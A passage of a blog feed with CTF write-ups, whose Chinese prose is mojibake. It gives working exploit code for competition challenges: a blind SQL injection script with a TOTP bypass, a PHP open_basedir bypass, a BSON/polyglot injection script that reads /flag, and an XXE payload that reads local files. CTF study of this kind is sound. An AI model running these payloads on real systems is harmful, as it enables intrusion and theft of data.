class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> succ_keyword <span class="keyword">in</span> prev_flag:</span><br><span class="line">                vuln2 = <span class="number">1</span></span><br><span class="line">                prev_flag = prev_flag.replace(succ_keyword, <span class="string">''</span>).strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    show_result(vuln1, vuln2, prev_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(argv) != <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">"wrong params."</span>)</span><br><span class="line">        print(<span class="string">"example: python %s %s %s"</span> % (argv[<span class="number">0</span>], <span class="string">'127.0.0.1'</span>, <span class="string">'80'</span>))</span><br><span class="line">        exit()</span><br><span class="line">    ip = argv[<span class="number">1</span>]</span><br><span class="line">    port = int(argv[<span class="number">2</span>])</span><br><span class="line">    site_url = <span class="string">'http://%s:%d'</span> % (ip, port)</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><p>PS: æ³¨æ„æ—¶åŒºé—®é¢˜</p><h2 id="0x04-giftbox"><a href="#0x04-giftbox" class="headerlink" title="0x04 giftbox"></a>0x04 giftbox</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>é€ç»™å°è›®è…°çš„ç¤¼ç‰©ï¼Œå¥¹æ˜¯ä¸€ä½ç¾ä¸½çš„å§‘å¨˜ã€‚</p><p>A gift for Canton Tower, a pretty girl.</p><h3 id="é¢˜ç›®è§£ç­”-3"><a href="#é¢˜ç›®è§£ç­”-3" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>PS: è¿™ä¸ªæ¨±èŠ±çœŸå¥½çœ‹ï¼Œä¸Šå»å°±å…ˆä¿å­˜äº†ï¼Œå“ˆå“ˆ</p><ol><li>çœ‹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://222.85.25.41:8090/js/</span><br></pre></td></tr></table></figure></li></ol><p>çŸ¥é“pyotp.zipå’Œ&gt;totp.min.jsæ˜¯é‡‡ç”¨äº†åŒå› å­è®¤è¯</p><ol start="2"><li><p>å¾—åˆ°å…³äºåŒå› å­è®¤è¯çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://222.85.25.41:8090/js/main.js</span><br></pre></td></tr></table></figure></li><li><p>loginå¤„ç™»å½•æ³¨å…¥å¾—åˆ°è´¦å·å¯†ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_data()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">'http://222.85.25.41:8090/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,</span><br><span class="line">                      data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print('login admin\'/**/and/**/(' + payload + ')/**/and/**/\'1\'=\'1 admin')</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># db_nums_payload = "select/**/count(*)/**/from/**/user"</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print("é•¿åº¦ä¸ºï¼š%d" % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># db_data = "select/**/version()"</span></span><br><span class="line">    <span class="comment"># db_data = "select/**/database()"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># db_data = "SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\'giftbox\'/**/LIMIT/**/&#123;&#125;,1".format(</span></span><br><span class="line">        <span class="comment">#     i)</span></span><br><span class="line">        <span class="comment"># db_data = "SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\'giftbox\'/**/and/**/table_name=\'users\'/**/LIMIT/**/&#123;&#125;,1".format(</span></span><br><span class="line">        <span class="comment">#     i)</span></span><br><span class="line">        db_data = <span class="string">"select/**/password/**/from/**/giftbox.users/**/limit/**/&#123;&#125;,1"</span>.format(</span><br><span class="line">            i)</span><br><span class="line">        db_name = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">            db_name_payload = <span class="string">"ascii(substr(("</span> + db_data + <span class="string">"),%d,1))"</span> % (</span><br><span class="line">                y)</span><br><span class="line">            db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"&gt; "</span> + db_name)</span><br><span class="line">        <span class="keyword">if</span> db_name == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å½“å‰æ•°æ®åº“ï¼šgiftbox</span><br><span class="line">æ•°æ®åº“ä¸­çš„è¡¨ï¼šusers</span><br><span class="line">è¡¨ä¸­çš„åˆ—ï¼š</span><br><span class="line">å€¼ï¼šid</span><br><span class="line">å€¼ï¼šusername</span><br><span class="line">å€¼ï¼špassword</span><br><span class="line">åˆ—ä¸­çš„æ•°æ®ï¼š</span><br><span class="line">usernameå€¼ï¼šadmin</span><br><span class="line">passwordå€¼ï¼šhint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç™»å½•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure></p><ol start="4"><li>bypass open_basedir</li></ol><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&apos;css&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;));</span><br></pre></td></tr></table></figure></p><p>æ ¹æ®è¿™ä¸ªå—é™çš„shellï¼Œå‘ç°æ˜¯è¦å¯¹ä¸Šé¢çš„payloadè¿›è¡Œåˆ‡åˆ†ï¼Œè€Œä¸”æ­¤å¤„è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ã€‚æ­¤å¤„å¯ä»¥ä½¿ç”¨å¦‚ä¸‹<a href="https://github.com/zer0yu/Berserker/blob/287246f133c22d35dca9af844f8f399d16445713/webfuzz-general/misc/alphanum_case_extra.txt" target="_blank" rel="noopener">fuzzå­—å…¸</a>æ¥å¯¹é‚£äº›å€¼è¢«è¿‡æ»¤äº†è¿›è¡Œfuzzï¼Œæµ‹è¯•å®Œä¹‹åå°±å¯ä»¥æ„é€ æ‹¼æ¥äº†ã€‚</p><p>å…ˆçœ‹ç›®å‰çš„è·¯å¾„ä»¥åŠéœ€è¦å‘å¤–è·³å‡ æ¬¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">targeting p print_r</span><br><span class="line">targeting v getcwd</span><br><span class="line">targeting w $n</span><br><span class="line">targeting x &#123;$p($v())&#125;</span><br><span class="line">launch</span><br></pre></td></tr></table></figure></p><p>ç¡®è®¤å®Œæ˜¯ä¸¤å±‚åæ„é€ payloadç›´æ¥æ‰“å°±è¡Œäº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">targeting a chdir</span><br><span class="line">targeting b css</span><br><span class="line">targeting c &#123;$a($b)&#125;</span><br><span class="line">targeting d ini_set</span><br><span class="line">targeting e open_basedir</span><br><span class="line">targeting f ..</span><br><span class="line">targeting g &#123;$d($e,$f)&#125;</span><br><span class="line">targeting h &#123;$a($f)&#125;</span><br><span class="line">targeting i &#123;$a($f)&#125;</span><br><span class="line">targeting j base64_</span><br><span class="line">targeting k decode</span><br><span class="line">targeting l $j$k</span><br><span class="line">targeting m Ly8v</span><br><span class="line">targeting n &#123;$l($m)&#125;</span><br><span class="line">targeting o &#123;$d($e,$n)&#125;</span><br><span class="line">targeting p print_r</span><br><span class="line">targeting q file_get_</span><br><span class="line">targeting r contents</span><br><span class="line">targeting s $q$r</span><br><span class="line">targeting t flag</span><br><span class="line">targeting u &#123;$p($s($t))&#125;</span><br><span class="line">launch</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/4uC2VS1iWqpwMOE.png" alt="å±å¹•å¿«ç…§ 2019-08-05 ä¸Šåˆ8.52.53.png"><br>PS: å…¶å®é‚£å¤©æ™šä¸Šå°±å‡ºäº†ï¼Œä½†æ˜¯è¢«è¿™ä¸ªç•Œé¢å›æ˜¾ç»™æ•´è’™äº†, emmmmmm</p><h2 id="0x05-9calc"><a href="#0x05-9calc" class="headerlink" title="0x05 9calc"></a>0x05 9calc</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>calcalcalc again and againâ€¦</p><p>9-calc-eposide.3</p><h3 id="é¢˜ç›®è§£ç­”-4"><a href="#é¢˜ç›®è§£ç­”-4" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>å‚è€ƒwp:<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/calcalcalc-family" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/calcalcalc-family</a></p><p>EXP:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'http://45.77.242.16/calculate'</span></span><br><span class="line"><span class="keyword">const</span> symbols = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_'</span>.split(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payloads = [</span><br><span class="line"><span class="comment">// Nodejs</span></span><br><span class="line"><span class="string">`1 + 0//5 or '''\n//?&gt;\nrequire('fs').readFileSync('/flag','utf-8')[&#123;index&#125;] == '&#123;symbol&#125;' ? 1 : 2;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// Python</span></span><br><span class="line"><span class="string">`(open('/flag').read()[&#123;index&#125;] == '&#123;symbol&#125;') + (str(1//5) == 0) or 2 or ''' #\n))//?&gt;\nfunction open()&#123;return &#123;read:()=&gt;'&#123;flag&#125;'&#125;&#125;function str()&#123;return 0&#125;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP</span></span><br><span class="line"><span class="string">`len('1') + 0//5 or '''\n//?&gt;\n1;function len()&#123;return 1&#125;/*&lt;?php\nfunction len($a)&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; file_get_contents('/flag')[&#123;index&#125;] == '&#123;symbol&#125;' ? "1" : "2"]);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> rets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> checkAnswer = <span class="function">(<span class="params">value</span>) =&gt;</span> axios.post(url, &#123;</span><br><span class="line">expression: &#123;</span><br><span class="line">value,</span><br><span class="line">_bsontype: <span class="string">"Symbol"</span></span><br><span class="line">&#125;,</span><br><span class="line">isVip: <span class="literal">true</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">p</span> =&gt;</span> p.data.ret === <span class="string">'1'</span>).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; payloads.length; j++) &#123;</span><br><span class="line"><span class="keyword">const</span> payload = payloads[j]</span><br><span class="line"><span class="keyword">let</span> flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line"><span class="keyword">const</span> ret = <span class="keyword">await</span> checkAnswer(payload.replace(<span class="regexp">/\&#123;flag\&#125;/g</span>, flag + symbols[i]).replace(<span class="regexp">/\&#123;symbol\&#125;/g</span>, symbols[i]).replace(<span class="regexp">/\&#123;index\&#125;/g</span>, index))</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">flag += symbols[i]</span><br><span class="line"><span class="built_in">console</span>.log(symbols[i])</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">index++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">rets.push(flag)</span><br><span class="line"><span class="built_in">console</span>.log(rets)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn().then(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(rets.join(<span class="string">''</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/KlW7ixLXV2k6ytw.png" alt="E236064C-3473-4B00-9F7E-0DA18A9D3A58.png"></p><p>PS: è¿™ä¸ªç³»åˆ—éšåå¾—å†reviewä¸€ä¸‹</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨å®¶å®…ç€ä¸æƒ³å†™wpï¼Œæ¥å­¦ç¬¬ä¸€å¤©è¡¥ä¸Š&lt;/p&gt;
&lt;h2 id=&quot;0x01-SSRF-Me&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Google Capture The Flag 2019 (Quals) WP</title>
    <link href="http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/"/>
    <id>http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/</id>
    <published>2019-07-18T08:44:53.000Z</published>
    <updated>2019-08-10T12:58:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å†™ç¯‡å¤ç›˜çš„å°æ°´æ–‡<br>æ–‡ç« é¦–å‘åœ¨åˆå¤©å…¬ä¼—å·ï¼Œè½¬è½½è¯·æ³¨æ„</p><h2 id="0x01-BNV"><a href="#0x01-BNV" class="headerlink" title="0x01 BNV"></a>0x01 BNV</h2><p>é¢˜ç›®æè¿°ï¼š</p><p>There is not much to see in this enterprise-readyâ„¢ web application.</p><p>é¢˜ç›®åœ°å€ï¼š</p><p><a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">https://bnv.web.ctfcompetition.com/</a></p><p>é¢˜ç›®è§£ç­”ï¼š</p><p>burpæŠ“åŒ…å‘ç°ä¼ è¾“jsonæ•°æ®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: bnv.web.ctfcompetition.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://bnv.web.ctfcompetition.com/</span><br><span class="line">Content-type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>è”æƒ³åˆ°jsonè½¬æ¢ä¸ºxxeè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œé¦–å…ˆä¸ºäº†éªŒè¯çŒœæƒ³ç›´æ¥ä¿®æ”¹HTTPå¤´Content-typeçš„å€¼ä¸ºapplication/xmlï¼Œé‡æ”¾æ•°æ®åŒ…ä¹‹åå‘ç°æŠ¥ä¸è§£æé”™è¯¯ï¼Œç¡®è®¤äº†çŒœæƒ³ã€‚</p><p><img src="https://i.loli.net/2019/07/18/5d3030f30ebe260056.png" alt="83EA2441-2660-437B-8AA6-38E1D4EA37B3.png"></p><p>æ‰‹åŠ¨æŠŠjsonè½¬æ¢ä¸ºxxeæ ¼å¼ï¼Œå‘ç°æŠ¥é”™è¯´ç¼ºå°‘DTD<br><img src="https://i.loli.net/2019/07/18/5d3031174d49928141.png" alt="39377EB4-BF43-4221-9B68-C6AC640C350A.png"></p><p>æƒ³åˆ°ä¹‹å‰çœ‹åˆ°çš„ä¸€ä¸ªç‚¹<a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">ã€Šä½¿ç”¨æœ¬åœ°DTDæ–‡ä»¶æ¥åˆ©ç”¨XXEæ¼æ´å®ç°ä»»æ„ç»“æœè¾“å‡ºã€‹</a></p><p>æ‰€ä»¥æ„é€ å¦‚ä¸‹paylaodå¯¹flagè¿›è¡Œè¯»å–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: bnv.web.ctfcompetition.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://bnv.web.ctfcompetition.com/</span><br><span class="line">Content-type: application/xml</span><br><span class="line">Content-Length: 374</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/18/5d30312f2941885347.png" alt="2EE1BB38-CEDE-41D0-B076-A55759EC0FFD.png"></p><p>æœ€ååˆ†äº«ä¸€ä¸ª<a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">XXE cheat sheet</a> &lt;â€”æœ‰ç‚¹è€äº†ï¼Œæ„Ÿè§‰å¯ä»¥æŠŠæˆ‘çš„ä¹Ÿæ•´ç†ä¸€ä¸‹å‘ä¸€å‘ï¼Ÿéšåæœ‰æ—¶é—´å†æ•´ç†å§ã€‚</p><h2 id="0x02-gLotto"><a href="#0x02-gLotto" class="headerlink" title="0x02 gLotto"></a>0x02 gLotto</h2><p>é¢˜ç›®æè¿°ï¼š</p><p>Are you lucky?</p><p>é¢˜ç›®é“¾æ¥ï¼š</p><p><a href="https://glotto.web.ctfcompetition.com/" target="_blank" rel="noopener">https://glotto.web.ctfcompetition.com/</a></p><p>é¢˜ç›®è§£ç­”ï¼š</p><p>ç‚¹å‡»é¡µé¢å³ä¸‹è§’å¯ä»¥çœ‹åˆ°é¡µé¢çš„æºç ï¼Œå…·ä½“çš„é“¾æ¥æ˜¯</p><p><a href="https://glotto.web.ctfcompetition.com/?src" target="_blank" rel="noopener">https://glotto.web.ctfcompetition.com/?src</a></p><p>ä»æºç ä¸­åˆ†ææˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li>orderxå‚æ•°æ‹¼æ¥å¯é€ æ³¨å…¥</li><li>orderxå¯¹åº”å››ä¸ªè¡¨ï¼Œè½®æ¢æŸ¥è¯¢</li><li>æ¯æ¬¡ç”Ÿæˆçš„sessionä¼šå­˜å…¥æ•°æ®åº“ä¸­</li><li>æäº¤çš„codeè·Ÿsessionç›¸åŒå°±å¯ä»¥å¾—åˆ°flagï¼Œè€Œä¸”åˆ¤æ–­å®Œå°±é”€æ¯session</li></ol><p>é‚£ä¹ˆè§£å†³é—®é¢˜çš„å…³é”®å°±æ˜¯åˆ©ç”¨æ³¨å…¥æ¥è·å–åˆ°ä¹‹å‰è®¾ç½®çš„sessionå€¼ï¼Œè€Œä¸”è¦é€šè¿‡å››æ¬¡orderxå‚æ•°çš„æ³¨å…¥ï¼ˆorder byæ³¨å…¥ï¼‰æ¥å®Œæˆã€‚</p><p>æ¥ä¸‹æ¥é‡‡ç”¨æ•°å­¦çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜</p><p><a href="https://cfreal.github.io/google-ctf-2019-glotto-writeup.html" 